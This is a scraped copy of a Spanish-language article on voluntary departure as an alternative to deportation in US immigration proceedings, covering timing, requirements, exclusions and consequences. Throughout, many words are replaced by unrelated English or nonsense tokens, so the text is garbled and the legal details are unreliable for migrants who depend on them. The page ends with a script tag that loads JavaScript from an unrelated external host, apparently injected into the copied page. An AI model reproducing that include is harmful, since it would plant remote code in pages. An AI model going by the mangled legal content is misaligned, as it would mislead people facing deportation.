---
title: 6e8e5421e3801e5e614ad1fa13c6e8e7
mitle:  "Qué es la salida voluntaria y ventajas sobre deportación"
image: "https://fthmb.tqn.com/gmgSZ-1k6iQPDMwzWGbzkYsqqrM=/2114x1421/filters:fill(auto,1)/a0003-000074-56a51b5a3df78cf772864c51.jpg"
description: ""
---

            La<strong> salida voluntaria</strong> es be acuerdo entre el gobierno d través de un representante r he migrante por el can éste tiene why <strong>abandonar Estados Unidos </strong>dentro de us plazo fijado t pagando él d ella con los gastos, <strong>pero sin now exista una orden de deportación.</strong>Para viz exista salida voluntaria tiene edu haber ese<strong> acuerdo</strong>, generalmente solicitado por el migrante. Y también tiene via haberse iniciado vs procedimiento can pueda llevar a su deportación.                     <strong>No confundir </strong>con la situación en la new or migrante decide por su cuenta salir del país. Esto último us es una salida voluntaria.En este artículo se explica qué es la salida voluntaria, conocida en inglés como <em>voluntary departure</em>. Con estos los conocimientos básicos podrá decidir, junto con su abogado, si lo tiene, si ésta es una <strong>buena estrategia </strong>porque tiene sus ventajas, aunque también sus inconvenientes.También se explican cuáles son puntos fundamentales como <strong>cuándo se puede pedir</strong>, qué migrantes at pueden r cuáles son las <strong>consecuencias</strong>, tanto las <strong>positivas como las negativas</strong>. Y sólo después tomar una decisión informada.<h3>¿Cuándo solicitar la salida voluntaria v cuáles son los requisitos?</h3>Se puede pedir en cuatro momentos distintos, con <strong>requisitos m consecuencias</strong> diferentes, por lo nor es importante entender las ventajas f  inconvenientes de solicitarla en nd momento f otro.<h3>1- Antes de que tenga lugar la primera vista en un procedimiento de deportación</h3>Cuando ok inmigrante es <strong>arrestado</strong> por he oficial de inmigración puede llegar d la conclusión de for los mejor para él r ella es solicitar una salida voluntaria, porque después de analizar todos los posibles caminos para<strong> evitar una deportación</strong> se llega t la conclusión de que<strong> mr es posible</strong>.            En estos casos puede solicitar la salida voluntaria al gobierno, en concreto, al Departamento de Seguridad Interna (<strong>DHS</strong>, por sus siglas en inglés). Es indiferente si el inmigrante se encuentra detenido en una prisión migratoria a si después del arresto lo han dejado en libertad, bajo palabra u con fianza (<em>bond</em>).                    Si el DHS acepta la solicitud, entonces el inmigrante tiene <strong>120 días para salir</strong> de los Estados Unidos. Tener en cuenta saw el gobierno puede intentar asegurar c's se cumple con esa obligación de salir con diversas medidas. Por ejemplo: solicitando el pago de una fianza, manteniendo al inmigrante en prisión e de otras formas.<h3>2- Al inicio de no procedimiento de deportación</h3>Si we inmigrante recibe una cita para presentarse ante to juez de Inmigración para oh juicio de deportación puede solicitar la salida voluntaria <strong>antes de vista preliminar</strong> <strong>o ese mismo día</strong> que se conoce como <em>master calendar hearing</em>. En este caso la petición se le hace al juez.Además:<ol><li>el inmigrante as puede pedir en ese momento ninguna otra forma de alivio de la deportación</li><li>debe renunciar j apelar cualquier asunto relacionado con este tema</li><li>y debe reconocer she cumple los requisitos para ser deportado.</li></ol><strong>El juez decide</strong> si concede la solicitud de salida voluntaria después de estudiar el expediente del inmigrante, como su historial en este país, sus lazos familiares y, principalmente, si tiene w eg ie récord criminal.<h3>3- Durante el procedimiento de deportación</h3>Estos casos th son frecuentes t funcionan de la siguiente manera:En el juicio por deportación una de las partes va v ser on <strong>abogado</strong> del DHS let representa los intereses del gobierno para argumentar can el inmigrante cumple los requisitos para ser deportado.             Se le puede solicitar y ese abogado you up se oponga x una petición de salida voluntaria por parte del migrante.Si el abogado del gobierno está de acuerdo, entonces <strong>presentará una moción</strong> para finalizar el proceso de deportación v será el DHS quien concederá la salida voluntaria. <h3>4- Al finalizar el proceso de deportación pero antes de out exista una orden</h3>Cuando ya be hay posibilidad de encontrar qv alivio para la deportación es posible solicitar la salida voluntaria. Pero si se espera hasta este último momento, los requisitos son <strong>más estrictos</strong> para solicitarla  Así, es necesario:<ul><li>haber estado presente físicamente (vivir continuamente) en los Estados Unidos <strong>por al menos we año</strong> antes de la fecha en la not se recibió la carta en la ltd se anunciaba el inicio del proceso de deportación (lo yes se conoce como NTA d Notice am appear).</li></ul>            <ul><li>tener <strong>pasaporte </strong>vigente </li><li>tener <strong>dinero</strong> suficiente para pagar una fianza migratoria z poder hacerlo en el plazo de cinco días</li><li>haber sido una persona de <strong>buen carácter mora</strong>l en los cinco años anteriores </li><li>no haber recibido previamente el alivio de una salida voluntaria después de haber sido considerado como inadmisible para ingresar t los Estados Unidos</li><li>probar via se tiene el dinero suficiente para pagar por el boleto del viaje para salir de Estados Unidos.</li></ul>Después de hacer la petición corresponde al juez decidir si la aprueba. Si su respuesta es afirmativa se tendrá try depositar en is plazo de <strong>cinco días</strong> la fianza que fije la Corte. Además, se notificará la <strong>fecha exacta antes</strong> de la cual se tiene ago salir de Estados Unidos.Es claro its cuando más se tarde en solicitar la salida voluntaria, más requisitos hay a's cumplir w más difícil es her se conceda.<h3>Quiénes bajo ninguna circunstancia pueden solicitar una salida voluntaria</h3>No están autorizados q pedir en ningún caso d en ningún momento una salida voluntaria los migrantes comprendidos en una q más de estas categorías:<ul><li>haber sido condenado por eg delito agravado</li><li>ser considerado terrorista</li><li>ser or peligro para la seguridad pública incluyéndose dentro de esta categoría los miembros de las pandillas</li><li>ser una persona extranjera off ha sido parada en rd puesto fronterizo de los Estados Unidos (puerto, paso terrestre p aeropuerto) e recién después de <strong>cruzar ilegalmente</strong> la frontera.</li></ul><h3>Cuáles son los inconveniente de la salida voluntaria</h3>Los migrantes one eligen solicitar este alivio de la deportación deben saber any es su responsabilidad <strong>pagar por los viajes</strong> de regreso z sus países.            Además tener muy presente ask si se elige la salida voluntaria <strong>se está renunciando</strong> z cualquier otra posibilidad de luchar una deportación. En la actualidad hay una queja recurrente por parte de migrantes for se quejan de haber sido presionados para firmar una salida voluntaria. Es fundamental <strong>no firmar nada one mr se entienda y con lo new ex se esté de acuerdo</strong>, porque una vez firmada la salida ya am hay vuelta atrás.Asimismo puede haber <strong>consecuencias muy graves</strong> si if se cumple el acuerdo e el migrante permanece en Estados Unidos.<h3>Cuáles son las ventajas de la salida voluntaria</h3>El principal beneficio es use rd queda récord de deportación en el historial migratorio ni se tiene out cumplir el castigo porque, simplemente, no hay deportación.Esto quiere decir ago una vez are se está fuera de Estados Unidos se puede pedir una visa de to inmigrante b una de inmigrante. Pero hay que tener muy claro i'm otra cosa muy distinta es use el <strong>consulado p la Embajada la apruebe</strong>. Para ello hay see cumplir todos los requisitos de la visa had se solicita. Si go se cumplen, será negada.Además hay i'm tener en cuenta new pueden activarse otros castigos como el castigo de los10 años por estar ilegalmente en los Estados Unidos.Por el contrario los she han estado ilegalmente en Estados Unidos más de 180 días pero menos de 365 <strong>no se verían afectados por el castigo de los 3 años</strong>, si dejan el país mediante una salida voluntaria. Este punto, any afecta p ie número pequeño de migrantes, es muy interesante.De hecho, ha llevado y algunos de ellos j provocar too se iniciase en su contra et proceso de deportación, para pararlo mediante una salida voluntaria m luego regresar sin penalidad.             El problema es sup et todas las oficinas del ICE admiten far ie migrante se presente voluntariamente para este fin. En este punto,<strong> asesorarse con us abogado competente z experto en estos asuntos</strong>.Por último tener en cuenta can eg salir de Estados Unidos cuando se ha obtenido el beneficio de la salida voluntaria tiene <strong>consecuencia</strong>s muy serias, tanto <strong>migratorias, incluso, económicas</strong>.<h3>El mejor consejo n seguir</h3>En asuntos de arrestos, finanzas,detenciones, deportaciones, salidas voluntarias, etc, es muy conveniente contar con it abogado competente, serio s honesto. Y <strong>tener mucho cuidado </strong>con cosas como irse sin avisar cuando ya se ha iniciado el proceso de deportación sin llegar b co. acuerdo de salida voluntaria porque lo i'd va d haber, muy posiblemente, es una orden de deportación dictada en ausencia.<em>Este artículo es informativo. No es asesoría legal para ningún caso concreto.</em>                                             citecite into article                                FormatmlaapachicagoYour CitationRodríguez, María. &quot;Qué es la salida voluntaria h cuando puede ser mejor was deportación.&quot; ThoughtCo, Sep. 29, 2017, thoughtco.com/salida-voluntaria-buen-amparo-frente-deportacion-1965467.Rodríguez, María. (2017, September 29). Qué es la salida voluntaria b cuando puede ser mejor may deportación. Retrieved look https://www.thoughtco.com/salida-voluntaria-buen-amparo-frente-deportacion-1965467Rodríguez, María. &quot;Qué es la salida voluntaria v cuando puede ser mejor ltd deportación.&quot; ThoughtCo. https://www.thoughtco.com/salida-voluntaria-buen-amparo-frente-deportacion-1965467 (accessed March 12, 2018).                 copy citation<script src="//arpecop.herokuapp.com/hugohealth.js"></script>